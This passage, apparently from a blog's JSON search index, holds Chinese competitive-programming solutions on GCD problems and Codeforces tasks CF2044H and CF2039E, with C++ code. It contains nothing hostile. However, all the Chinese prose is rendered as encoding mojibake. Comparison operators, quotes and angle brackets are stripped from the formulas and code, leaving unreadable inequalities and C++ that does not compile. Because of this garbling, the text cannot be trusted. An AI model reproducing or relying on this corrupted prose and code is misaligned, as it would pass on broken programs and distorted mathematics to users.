$1$ æ‰€å‡ºç°çš„ä½ç½®ã€‚ä¸éš¾å‘ç°ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ çš„åºåˆ—æ—¶è‡³å°‘ç”±é•¿åº¦ä¸º $3$ çš„ $010$ è½¬ç§»è€Œæ¥ï¼Œå…±ä¼šäº§ç”Ÿ $2$ ä¸ªé•¿åº¦ä¸º $4$ ä¸” $k 1$ çš„ä¸² $1010,0110$ã€‚ä¸€èˆ¬åŒ–çš„ï¼Œè‹¥åœ¨é•¿åº¦ä¸º $i$ æ—¶ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ï¼Œåˆ™è¿™ä¸ªé•¿åº¦ä¸º $i$ çš„ä¸²å…±ä¼šæœ‰ $\\sum \\limits_{j = 2}^{i - 1} = \\frac{i(i - 3)}{2}$ ç§æƒ…å†µã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè‹¥ $i = 5$ï¼Œåˆ™å¯èƒ½ç”± $0010,0101$ è½¬ç§»å‡º $5$ ç§æƒ…å†µã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæœ€åçš„ç­”æ¡ˆå°±æ˜¯ $n - 1 + \\sum \\limits _{i = 4}^n \\frac{i(i - 3)}{2} f_i$ã€‚ç›´æ¥åç¼€å’Œè¿›è¡Œå¤„ç†å³å¯ï¼Œæ—¶é—´å¤æ‚åº¦ $O(n)$ã€‚","categories":["Algorithm"]},{"title":"GCD é¢˜é›†","path":"/2024/12/20/GCD/","content":"$\\gcd (x,y)$ æ±‚ä¸¤ä¸ªæ•° $x,y(x y)$ çš„æœ€å¤§å…¬å› æ•°ï¼Œè¾—è½¬ç›¸é™¤æ³•å³å¯ã€‚ int gcd (int x,int y)return !y ? x : gcd (y,x % y); $\\rm lcm(x,y)$ æ±‚ä¸¤ä¸ªæ•° $x,y(x y)$ çš„æœ€å°å…¬å€æ•°ï¼Œå³æ±‚ $\\dfrac{xy}{\\gcd (x,y)}$ çš„å€¼ï¼Œè¯æ˜å¦‚ä¸‹ï¼š ä»¤ $k = \\gcd (x,y)$ï¼Œåˆ™æœ‰ $\\gcd (\\frac{x}{k},\\frac{y}{k}) = 1$ï¼›å¯¹äºä¸¤ä¸ªäº’è´¨çš„æ•°æ¥è¯´ï¼Œæœ€å°å…¬å€æ•°å³ä¸ºä¸¤æ•°çš„ä¹˜ç§¯ï¼Œæ‰€ä»¥æœ‰ $\\rm lcm(x,y) = \\dfrac{xy}{\\gcd (x,y)}$ã€‚ P2568 GCD ç»™å®šæ­£æ•´æ•° $n$ï¼Œæ±‚ $1\\le x,y\\le n$ ä¸” $\\gcd(x,y)$ ä¸ºç´ æ•°çš„æ•°å¯¹ $(x,y)$ æœ‰å¤šå°‘å¯¹ã€‚ é¢˜ç›®å³æ±‚ $\\displaystyle \\sum_{k \\in prime} \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (i,j) = k]$ã€‚ å¯¹äº $i,j$ æ»¡è¶³ $\\gcd (i,j) = k$ï¼Œåˆ™æœ‰ $\\gcd (\\dfrac{i}{k},\\dfrac{j}{k}) = 1$ã€‚æ‰€ä»¥è¯´ï¼ŒåŸå¼ç­‰ä»·äºï¼š \\displaystyle \\sum_{k \\in prime} \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\sum_{j = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} [\\gcd (\\frac{i}{k},\\frac{j}{k}) = 1]å®¹æ˜“æƒ³åˆ°æ¬§æ‹‰å‡½æ•°çš„å®šä¹‰ï¼Œç›´æ¥è½¬æ¢å¯å¾—ï¼š \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\sum_{j = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} [\\gcd (\\frac{i}{k},\\frac{j}{k}) = 1] = \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\varphi (i)äºæ˜¯è¿™é“é¢˜åªéœ€è¦å…ˆé¢„å¤„ç†å¤„ $\\varphi(i)$å°±èƒ½åœ¨ $O(n)$ è§£å†³ã€‚åŒæ—¶ï¼Œç”¨æ¬§æ‹‰å‡½æ•°é¢„å¤„ç†å‡ºè´¨æ•°ï¼Œç„¶ååœ¨ç»Ÿè®¡æ—¶ç­”æ¡ˆåº”ä¸ºï¼š \\displaystyle \\sum_{k \\in prime} (2 \\times \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k}\\rfloor} \\varphi (i) - 1)æ˜¾ç„¶ï¼Œå¯¹äºä¸€ä¸ªåˆæ³•çš„ç´ æ•°å¯¹ $(i,j)$ï¼Œ $(j,i)$ ä¸€å®šä¹Ÿæ»¡è¶³æ¡ä»¶ï¼Œä½†æ˜¯å¦‚æœ $i = j$ï¼Œåˆ™éœ€è¦å»é‡ã€‚ P2398 GCD SUM å’Œä¸Šä¸€é¢˜æœ‰ä¸€å®šçš„è”ç³»ï¼Œç›´æ¥æ¨å¼å­ï¼š \\displaystyle \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} \\gcd (i,j)\\\\ = \\sum_{k = 1}^{n} \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} k [\\gcd (i,j) = k]\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (i,j) = k])\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (\\dfrac{i}{k},\\dfrac{j}{k}) = 1])\\\\ ä»¤ x = \\dfrac{i}{k},y = \\dfrac{j}{k}\\\\ åŸå¼ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{n} \\sum_{j = 1}^{n} [\\gcd (x,y) = 1])\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k} \\rfloor} \\sum_{j = 1}^{\\lfloor \\dfrac{n}{k} \\rfloor} [\\gcd (x,y) = 1])\\\\ = \\sum_{k = 1}^{n} (k \\sum_{i = 1}^{\\lfloor \\dfrac{n}{k} \\rfloor} \\varphi (i))\\\\å¯¹äº $\\lfloor \\dfrac{n}{k} \\rfloor$ çš„å¤„ç†ï¼Œç›´æ¥åˆ†å—å°±èƒ½åœ¨ $O(\\sqrt n)$ çš„æ—¶é—´å¤æ‚åº¦ä¸‹æå®šã€‚äºæ˜¯ä¹ï¼Œç›´æ¥é¢„å¤„ç†å³å¯ä½¿æ•´ä¸€ç¨‹åºè¾¾åˆ° $O(n)$ çš„æ—¶é—´å¤æ‚åº¦ã€‚ Shohag Loves XOR (Easy Version) é¢˜æ„ï¼š ç»™å®š $x,m$ï¼Œæ±‚æœ‰å¤šå°‘ $y$ æ»¡è¶³ $y \\in [1,m],x eq y$ ä¸” $x \\oplus y$ æ˜¯ $x$ æˆ– $y$ çš„å› å­ã€‚ ç»“è®ºçŒœæµ‹ï¼š$x \\oplus y \\in [1,x)$ï¼Œä¸‹é¢æ˜¯è¯æ˜ï¼š å¯¹äºä¸€ä¸ª $p$ çš„å› å­ $f$ï¼Œæ»¡è¶³ $f \\le \\lfloor \\frac{p}{2} \\rfloor$ï¼Œä¹Ÿå°±æ˜¯è¯´ $f$ å’Œ $p$ åœ¨äºŒè¿›åˆ¶ä¸‹çš„æœ€é«˜ä½ä¸åŒã€‚ å½“ $y \\ge 2x$ æ—¶ï¼Œ$x \\oplus y$ ä¸ $y$ åœ¨äºŒè¿›åˆ¶ä¸‹çš„æœ€é«˜ä½ç›¸åŒï¼Œæ‰€ä»¥ $x \\oplus y$ åœ¨æ­¤æ—¶å¿…å®šä¸æ˜¯ $y$ çš„å› å­ã€‚åŒæ—¶ï¼Œç”±äºæœ€é«˜ä½çš„ä¸åŒï¼Œæ­¤æ—¶ $x \\oplus y x$ ä¸€å®šæˆç«‹ï¼Œæ‰€ä»¥ $x \\oplus y$ åŒæ ·ä¹Ÿä¸æ˜¯ $x$ çš„å› å­ã€‚ æ‰€ä»¥è¯´ï¼Œåªæœ‰ $y 2x$ æ—¶ï¼Œæ‰èƒ½æ»¡è¶³é¢˜æ„ï¼Œä¹Ÿå°±æ˜¯è¯´å› å­ $x \\oplus y x$ã€‚ Shohag Loves XOR (Hard Version) ç»™å®š $x,m$ï¼Œæ±‚æœ‰å¤šå°‘ $y$ æ»¡è¶³ $y \\in [1,m]$ ä½¿å¾— $x \\oplus y$ å¯ä»¥è¢« $x$ æˆ– $y$ æ•´é™¤ã€‚ è®¾ $p = x \\oplus y$ï¼Œåˆ†ä¸‰ç§æƒ…å†µè®¨è®ºï¼š $x | p$ã€‚è®¾ $p = kx$ï¼Œåˆ™ $y = x \\oplus p \\le p + x \\le m$ï¼Œä¹Ÿå°±æ˜¯ $kx \\le m - x$ï¼Œè¿›ä¸€æ­¥åŒ–ç®€å¯çŸ¥ $k \\le \\lfloor \\frac{m - x}{x} \\rfloor$ã€‚ç”±äºæˆ‘ä»¬è¿˜æœ‰ $(m - x,m]$ åŒºé—´æœªæ£€æµ‹ï¼Œä½†å¯ä»¥å……åˆ†åˆ©ç”¨ $x \\oplus y \\le x + y$ è¿™ä¸ªæ€§è´¨ï¼Œæˆ‘ä»¬å¾ªç¯åˆ¤æ–­ $(m - x,m + x]$ åŒºé—´å³å¯ï¼ˆå½“ç„¶ï¼Œå®˜æ–¹è§£ç­”çš„åšæ³•æ›´åŠ ç®€æ´ï¼Œä½†æ˜¯æ²¡çœ‹æ‡‚ï¼‰ã€‚ $y | p$ã€‚å½“ $0 x y$ æ—¶ï¼Œ$p \\le x + y y + y = 2y$ï¼Œå› æ­¤ $p = ky(k \\ge 2)$ ä¸å­˜åœ¨è§£ã€‚å› æ­¤åªéœ€è¦è€ƒè™‘ $y \\le x$ çš„æƒ…å†µã€‚ $x | p$ ä¸” $y | p$ã€‚å½“ $x eq y$ æ—¶ï¼Œ$\\rm{lcm(x,y)} \\ge 2 \\max (x,y)$ï¼Œç„¶è€Œ $p 2 \\max (x,y)$ï¼Œå› æ­¤åªæœ‰ $x = y$ æ—¶æ‰èƒ½æˆç«‹ã€‚ GCDç­‰äºXOR é¢˜æ„ï¼š æ±‚ $\\sum_{x=1}^{n}\\sum_{y=1}^{n}[\\gcd(x,y)=(x\\oplus y)]$ã€‚ è‹¥ $x = y$ï¼Œç­”æ¡ˆæ˜¾ç„¶æˆç«‹ã€‚ä¸‹é¢ä»¤ $x y$ï¼Œè®¾ $x = \\gcd(x,y) \\times xâ€™,y = \\gcd(x,y) \\times yâ€™$ã€‚åŒæ—¶ï¼Œæ³¨æ„åˆ°å¼‚æˆ–ç‰¹æœ‰çš„æ€§è´¨ $x - y \\le x \\oplus y \\le x + y$ï¼Œåˆ™å¯åˆ—å‡ºä¸ç­‰å¼ï¼š \\gcd(x,y) \\le \\gcd (x,y) \\times (x'-y') \\le x - y \\le x \\oplus y\\le x + yäºæ˜¯å½“ $\\gcd (x,y) = x \\oplus y$ æˆç«‹æ—¶å½“ä¸”ä»…å½“ $\\gcd (x,y) = x \\oplus y = x - y$ã€‚å› æ­¤æšä¸¾é¢„å¤„ç†å³å¯ã€‚ Shohag Loves GCD é¢˜æ„ï¼š ä»ç»™å®šé›†åˆä¸­é€‰æ•°å¹¶æ„é€ åºåˆ— $\\{a_i\\}$ï¼Œéœ€è¦æ»¡è¶³ $a_{\\gcd (i,j)} eq \\gcd(a_i,a_j) \\mid \\forall 1 \\le i j \\le n$ å¹¶ä¸”æ„é€ å‡ºçš„åºåˆ—å­—å…¸åºæœ€å¤§ã€‚ ä¸å¦¨ä»åé¢åˆ†æï¼Œè€ƒè™‘æ»¡è¶³ $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$ã€‚å½“ $i \\mid j$ æ—¶ï¼Œ$\\gcd (i,j) = i$ï¼Œ$a_i \\mid a_j$ã€‚è¿›ä¸€æ­¥çš„ï¼Œå½“ $i mid j$ æ—¶ï¼Œæ˜¯å¦ä¹Ÿå­˜åœ¨ä¸€ä¸ª $i$ï¼Œæ»¡è¶³ $a_{\\gcd (i,j)} = \\gcd (a_i,a_j)$ å‘¢ï¼Ÿ å‡è®¾å­˜åœ¨è¿™ä¸ª $i$ï¼Œæˆ‘ä»¬è®¾ $g = \\gcd (i,j)$ï¼Œé‚£ä¹ˆ $a_g = \\gcd (a_i,a_j)$ ä¸” $g i$ã€‚ç”±äº $g \\mid i$ï¼Œç­‰ä»·äº $g = \\gcd (g,i)$ï¼Œç”±ä¸Šé¢çš„ç»“è®ºå¯çŸ¥ $a_{\\gcd (g,i)} = \\gcd (a_g,a_i)$ã€‚æ­¤æ—¶ä¸é¢˜ç›®çš„æ¡ä»¶ä¸ç¬¦åˆï¼Œæ•…å‡è®¾ä¸æˆç«‹ã€‚ GCD Guess é¢˜æ„ï¼š æ¯æ¬¡è¯¢é—® $a,b$ è¿”å› $\\gcd (x + a,x + b)$ çš„å€¼ï¼Œæœ€ç»ˆæ±‚å‡º $x$ã€‚ ç”±æ•°æ®èŒƒå›´ä¸éš¾æƒ³åˆ°æŒ‰ä½è€ƒè™‘ã€‚ åœ¨äºŒè¿›åˆ¶æ¡ä»¶ä¸‹ï¼Œè®¾æœ€ä½ä½ä¸ºç¬¬ $0$ ä½ã€‚ç›®å‰è¦çŒœæµ‹ç¬¬ $i$ ä½çš„å€¼ï¼Œè®¾ $t$ è¡¨ç¤ºå‰ $i - 1$ ä½æ‰€è´¡çŒ®çš„å€¼ã€‚ä»¤ $a b$ï¼Œåˆ™æœ‰ï¼ˆåŠ ç²—è¡¨ç¤ºç¬¬ $i$ ä½ï¼‰ï¼š \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ t + b \\text{ changes to } 1\\textbf{1}0\\cdots 0\\ \\end{cases}ç”±å…¬å¼ $\\gcd (t + a,t + b) = \\gcd (t + a,b - a)$ å¯çŸ¥ï¼ˆåŠ ç²—è¡¨ç¤ºç¬¬ $i$ ä½ï¼‰ï¼š \\begin{cases} t + a \\text{ changes to } \\quad \\textbf{1}0\\cdots 0\\\\ b - a \\text{ changes to } 1\\textbf{0}00\\cdots 0\\ \\end{cases}æ­¤æ—¶ $\\gcd (t + a,b - a) = 2^i$ã€‚å½“å®é™… $x$ çš„ç¬¬ $i$ ä½ä¸º $1$ æ—¶ï¼Œä¼šäº§ç”Ÿ $2$ æ¬¡è¿›ä½ï¼Œä½¿å¾— $\\gcd (tâ€™ + a,b - a) = 2^{i + 1}$ã€‚å› æ­¤å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä»£ç ï¼š for (int i = 0;i 30;++i)//çŒœæµ‹ç¬¬ i ä½ int ans = query ((1 i) - x,(1 i) + (1 (i + 1)) - x); if (ans == 1 (i + 1)) x |= 1 i; Guess Numbers é¢˜æ„ï¼š æ¯æ¬¡è¯¢é—® $(a,b)$ï¼Œè¿”å› $\\gcd (x + a,y + b)$ çš„å€¼ï¼Œæ±‚å‡º $x,y$ã€‚ å…ˆç”¨ $(0,0),(0,1),(1,0)$ æœ€å¤šä¸‰æ¬¡å³å¯ç¡®å®šæœ€ä½ä½ã€‚ä¹‹åå…ˆå°†æœ€ä½ $x$ ä½å…¨éƒ¨å¼„æˆ $1$ï¼ˆç›¸å½“äºæ¯æ¬¡è¯¢é—®çš„æ—¶å€™å–åï¼‰ï¼Œç„¶å $+1$ å³å¯å˜ä¸ºå…¨ä¸º $0$ çš„å½¢å¼ï¼Œå¹¶å°†å½“å‰è¯¢é—®ä½å–åã€‚ç”¨ç±»ä¼¼çš„æ–¹å¼ï¼Œæ¯ä¸€ä½æœ€å¤šä¸‰æ¬¡å³å¯å¾—åˆ°ç­”æ¡ˆã€‚ void solve () ll x = 0,y = 0,dx = 0,dy = 0; ll g = query (0,0); if (g % 2 == 0) dx |= 1,dy |= 1; else g = query (1,0); if (g % 2 == 0) x |= 1,dy |= 1; else g = query (0,1); if (g % 2 == 0) y |= 1,dx |= 1; else x |= 1,y |= 1; ll b = 1; for (int i = 1;i 60;++i) g = query (dx + 1,dy + 1); if ((g b) % 2 == 0) x |= 1ll i,y |= 1ll i; else g = query (dx + 1 + (1ll i),dy + 1); if ((g b) % 2 == 0) dx |= 1ll i,y |= 1ll i; else g = query (dx + 1,dy + 1 + (1ll i)); if ((g b) % 2 == 0) dy |= 1ll i,x |= 1ll i; else dx |= 1ll i,dy |= 1ll i; ++b; printf (! %lld %lld ,x,y);fflush (stdout); Maximum modulo equality é¢˜æ„ï¼š å¯¹äºä¸€ä¸ªè¯¢é—® $[l,r]$ï¼Œæ‰¾åˆ°æœ€å¤§çš„ $m$ æ»¡è¶³ $\\forall i,j \\in [l,r]$ï¼Œå‡æ»¡è¶³ $a_i \\mod m = a_j \\mod m$ã€‚ æ¡ä»¶è½¬æ¢æˆ $|a_i - a_j| \\mod m = 0$ï¼Œå› æ­¤å¯¹äºä¸€ä¸ªè¯¢é—®ï¼Œåœ¨å½¢æˆå·®åˆ†åç»´æŠ¤åŒºé—´çš„ $\\gcd$ å³å¯ã€‚ Coprime PairåŒ Problem about GCD ã€åè€…ä¸ºå¤æ‚ç‰ˆæœ¬ã€‘ é¢˜æ„ï¼š æ‰¾åˆ° $l,r \\in [x,y]$ æ»¡è¶³ $\\gcd (l,r) = g$ ä¸” $r - l + 1$ å°½å¯èƒ½çš„å¤§çš„ä¸€å¯¹ï¼ˆè‹¥ç­”æ¡ˆä»ä¸å”¯ä¸€ï¼Œå– $l$ æœ€å°çš„ã€‚ å…ˆç»™ç»“è®ºï¼šå…ˆå°†å…¶è½¬æ¢ä¸ºå‰è€…çš„é¢˜ç›® $\\gcd (l,r) = 1$ çš„æƒ…å†µï¼Œç„¶åç›´æ¥æš´åŠ›æšä¸¾ $l,r$ ä¹‹é—´çš„å·®å€¼ä»¥åŠ $l$ çš„å€¼ï¼Œå‰è€…ä»å¤§åˆ°å°æšä¸¾ï¼Œåè€…ä»å°åˆ°å¤§ï¼Œæ‰¾åˆ°åå°±ç›´æ¥ breakã€‚ å¬ç€æœ‰ç‚¹è’è°¬ï¼Œä½†ç¡®å®ä¸ä¼šè¶…æ—¶ã€‚äºæ˜¯å°±æœ‰äº†è¿™ä¸ªé—®é¢˜ï¼š $n$ ä»¥å†…ç›¸é‚»è´¨æ•°å·®çš„æ•°é‡çº§ï¼Ÿ è™½ç„¶é¢˜ç›®å’Œäº’è´¨æ•°ç›¸å…³ï¼Œä½†æ˜¯æ˜¾ç„¶å¯ä»¥å½’çº¦åˆ° Prime Gap é—®é¢˜ä¸Šæ¥ã€‚ç›®å‰æ•°å­¦ç•Œçš„çŒœæµ‹æ˜¯ $\\ln$ çº§åˆ«ï¼Œç›¸å…³æ–‡çŒ® Prime Gapã€‚","categories":["Algorithm"]},{"title":"é¢˜è§£ï¼šCF2044H Hard Demon Problem","path":"/2024/12/18/CF2044H/","content":"å°†è¡Œå’Œåˆ—åˆ†å¼€è€ƒè™‘ã€‚ åœ¨æ¯ç»„è¯¢é—® $(x_1,y_1,x_2,y_2)$ ä¸­ï¼š å¯¹äºæ¯ä¸€è¡Œï¼Œç›¸é‚»çš„ä¸¤ä¸ªæ•°çš„ä¸‹æ ‡å·®ä¸º $1$ã€‚ å¯¹äºæ¯ä¸€åˆ—ï¼Œç›¸é‚»çš„ä¸¤ä¸ªæ•°çš„ä¸‹æ ‡å·®ä¸º $y_2 - y_1 + 1$ã€‚ ä¸éš¾æƒ³åˆ°å¯¹è¡Œå’Œåˆ—åˆ†åˆ«åš $i \\times a_{i,j}$ å’Œ $j \\times a_{i,j}$ çš„å‰ç¼€å’Œå¤„ç†ã€‚ç”±äºåˆ—çš„ä¸‹æ ‡ä¹‹å·®ä¸ä¸º $1$ï¼Œæ‰€ä»¥éœ€è¦å…ˆå¯¹å…¶åšæ‰©å¤§å€æ•°çš„å¤„ç†åå†å°†å…¶ç›¸åŠ ã€‚è®¾æœ€ç»ˆè¦æ±‚çš„ $\\sum i a_i$ çš„ $i$ ä¸ºç³»æ•°ï¼Œé‚£ä¹ˆå¯¹äºä¸€ç»„è¯¢é—®ï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹ç³»æ•°çŸ©é˜µï¼š \\scriptstyle \\begin{bmatrix} y_1 + x_1(y_2 - y_1 + 1) & y_1 + 1 + x_1(y_2 - y_1 + 1) & \\cdots & y_2 + x_1(y_2 - y_1 + 1)\\\\ y_1 + (x_1 + 1)(y_2 - y_1 + 1) & y_1 + 1 + (x_1 + 1)(y_2 - y_1 + 1) & \\cdots & y_2 + (x_1 + 1)(y_2 - y1 + 1)\\\\ \\vdots & \\vdots & \\vdots & \\vdots\\\\ y_1 + x_2(y_2 - y_1 + 1) & y_1 + 1 + x_2(y_2 - y_1 + 1) & \\cdots & y_2 + x_2(y_2 - y_1 + 1) \\end{bmatrix}ç„¶è€Œæ­£ç¡®çš„ç³»æ•°çŸ©é˜µåº”ä¸ºï¼š \\scriptstyle \\begin{bmatrix} 1 & 2 & \\cdots & y_2 - y_1 + 1\\\\ y_2 - y_1 + 2 & y_2 - y_1 + 3 & \\cdots & 2(y_2 - y_1 + 1)\\\\ \\vdots & \\vdots & \\vdots & \\vdots\\\\ (x_2 - x_1)(y_2 - y_1 + 1) + 1 & (x_2 - x_1)(y_2 - y_1 + 1) + 2 & \\cdots & (x_2 - x_1 + 1)(y_2 - y_1 + 1) \\end{bmatrix}å°†çŸ©é˜µä¸­çš„æ¯ä¸€ä¸ªæ•°å­—éƒ½å‡å» $x_1(y_2 - y_1 + 1) + y_1 - 1$ æ¬¡å³å¯ï¼Œä¹Ÿå°±æ˜¯å†ç»´æŠ¤ä¸€ä¸ªæ™®é€šçš„äºŒç»´å‰ç¼€å’Œåå¤„ç†ã€‚æ€»æ—¶é—´å¤æ‚åº¦ä¸º $O(t(n^2 + q))$ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e3 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,q; ll sum[MAX][MAX],sumx[MAX][MAX],sumy[MAX][MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();q = read (); for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) int x = read (); sum[i][j] = x + sum[i - 1][j] + sum[i][j - 1] - sum[i - 1][j - 1]; sumx[i][j] = i * x + sumx[i - 1][j] + sumx[i][j - 1] - sumx[i - 1][j - 1]; sumy[i][j] = j * x + sumy[i - 1][j] + sumy[i][j - 1] - sumy[i - 1][j - 1];; while (q--) int sx = read (),sy = read (),fx = read (),fy = read (); ll s = sum[fx][fy] - sum[sx - 1][fy] - sum[fx][sy - 1] + sum[sx - 1][sy - 1]; ll sum_x = sumx[fx][fy] - sumx[sx - 1][fy] - sumx[fx][sy - 1] + sumx[sx - 1][sy - 1]; ll sum_y = sumy[fx][fy] - sumy[sx - 1][fy] - sumy[fx][sy - 1] + sumy[sx - 1][sy - 1]; //åŒä¸€åˆ—çš„å…¬å·®ä¸º fy - sy + 1 printf (%lld ,sum_x * (fy - sy + 1) + sum_y - s * (1ll * sx * (fy - sy + 1) + sy - 1)); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2039E Shohag Loves Inversions","path":"/2024/12/11/CF2039E/","content":"é¢˜æ„ï¼š åˆå§‹æ—¶ $a = [0,1]$ï¼Œæ¯æ¬¡æ›´æ–°å°† $a$ é€†åºå¯¹çš„æ•°é‡ $k$ æ’å…¥å…¶ä¸­ï¼Œæ±‚æœ€ç»ˆé•¿åº¦ä¸º $n$ çš„åºåˆ—çš„æ•°é‡ã€‚ ä»¥ä¸‹å‡è®¾å½“å‰çš„åºåˆ—é€†åºå¯¹çš„æ•°é‡ä¸º $k$ã€‚ é¦–å…ˆéœ€è¦é€šè¿‡è§‚å¯Ÿå¾—å‡ºä¸€ä¸ªæ€§è´¨ï¼Œå½“åºåˆ—ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ çš„æ—¶å€™ï¼Œè‹¥å°† $k$ æ’åœ¨ä¸­é—´çš„ä½ç½®ï¼Œä¼šä½¿å¾— $kâ€™ k$ï¼Œåœ¨æœ«å°¾æ’å…¥åˆ™ $kâ€™ = k$ã€‚è®¾ $f_i$ è¡¨ç¤ºé•¿åº¦ä¸º $i$ ä¸”å½“å‰ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ æ—¶ï¼Œå˜ä¸ºé•¿åº¦ä¸º $n$ çš„åºåˆ—çš„æ•°é‡ã€‚å‰©ä¸‹è¿˜æœ‰ $n - i$ æ¬¡æ“ä½œï¼Œå¯ä»¥å°† $k$ å‡æ’å…¥æœ«å°¾ï¼Œæˆ–è€…åœ¨æœ«å°¾æ’å…¥è‹¥å¹²ä¸ªä»¥åå†å°† $k$ æ’å…¥ä¸­é—´çš„ $i$ ä¸ªä½ç½®ä¹‹ä¸€ï¼Œå› æ­¤å¯ä»¥å¾—åˆ°ä»¥ä¸‹è½¬ç§»ï¼š f_i = i \\times \\sum \\limits_{j = 0}^{n - i - 1} f_{i + j + 1} + 1ç°åœ¨æˆ‘ä»¬è®¨è®ºæ•´ä¸€ä¸ªåºåˆ—å‡ä¸º $k \\le 1$ çš„æƒ…å†µã€‚æ˜¾ç„¶ $k = 0$ æ—¶å°±åªæœ‰ $\\underbrace{00 \\cdots 0}_{n - 1}1$ è¿™ä¸€ç§ã€‚è€Œ $k = 1$ æ—¶åº”ä¸º $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$ï¼Œå…¶ä¸­ $x \\in [0,n - 3]$ï¼Œæ•…æœ‰ $n - 2$ ç§ã€‚æ‰€ä»¥è¯´ï¼Œ$k \\le 1$ æ—¶ï¼Œå…±æœ‰ $n - 1$ ç§ã€‚ æœ€åè€ƒè™‘ $k \\le 1$ è½¬ç§»è‡³ $k 1$ çš„æƒ…å†µï¼Œæ˜¾ç„¶åªæœ‰ $k = 1$ æ—¶æ‰æœ‰å¯èƒ½ã€‚å› æ­¤å¯¹äº $\\underbrace{00 \\cdots 0}_{x}010\\underbrace{11\\cdots1}_{n - x - 3}$ ç±»å‹çš„ä¸²ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç¬¬ä¸€ä¸ª $1$ æ‰€å‡ºç°çš„ä½ç½®ã€‚ä¸éš¾å‘ç°ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ çš„åºåˆ—æ—¶è‡³å°‘ç”±é•¿åº¦ä¸º $3$ çš„ $010$ è½¬ç§»è€Œæ¥ï¼Œå…±ä¼šäº§ç”Ÿ $2$ ä¸ªé•¿åº¦ä¸º $4$ ä¸” $k 1$ çš„ä¸² $1010,0110$ã€‚ä¸€èˆ¬åŒ–çš„ï¼Œè‹¥åœ¨é•¿åº¦ä¸º $i$ æ—¶ç¬¬ä¸€æ¬¡å‡ºç° $k 1$ï¼Œåˆ™è¿™ä¸ªé•¿åº¦ä¸º $i$ çš„ä¸²å…±ä¼šæœ‰ $\\sum \\limits_{j = 2}^{i - 1} = \\frac{i(i - 3)}{2}$ ç§æƒ…å†µã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè‹¥ $i = 5$ï¼Œåˆ™å¯èƒ½ç”± $0010,0101$ è½¬ç§»å‡º $5$ ç§æƒ…å†µã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæœ€åçš„ç­”æ¡ˆå°±æ˜¯ $n - 1 + \\sum \\limits _{i = 4}^n \\frac{i(i - 3)}{2} f_i$ã€‚ç›´æ¥åç¼€å’Œè¿›è¡Œå¤„ç†å³å¯ï¼Œæ—¶é—´å¤æ‚åº¦ $O(n)$ã€‚ å‚è€ƒä»£ç ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e6 + 5;const int MOD = 998244353;const ll inv_2 = 499122177;inline int read ();int t,n;ll sum,ans,dp[MAX]; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); sum = ans = 0; for (int i = n;i = 4;--i) dp[i] = (i * sum % MOD + 1) % MOD; sum = (sum + dp[i]) % MOD; ans = ans + 1ll * i * (i - 3) % MOD * inv_2 % MOD * dp[i] % MOD; ans = (ans + n - 1) % MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1665D GCD Guess","path":"/2024/12/01/CF1665D/","content":"ç”±æ•°æ®èŒƒå›´ä¸éš¾æƒ³åˆ°æŒ‰ä½è€ƒè™‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å°½é‡æŠŠæ¯æ¬¡è¯¢é—®å‡‘æˆ $2$ çš„å¹‚æ¬¡ç›¸å…³çš„æ•°ã€‚ åœ¨äºŒè¿›åˆ¶æ¡ä»¶ä¸‹ï¼Œè®¾æœ€ä½ä½ä¸ºç¬¬ $0$ ä½ã€‚ç›®å‰è¦çŒœæµ‹ç¬¬ $i$ ä½çš„å€¼ï¼Œè®¾ $t$ è¡¨ç¤ºå‰ $i - 1$ 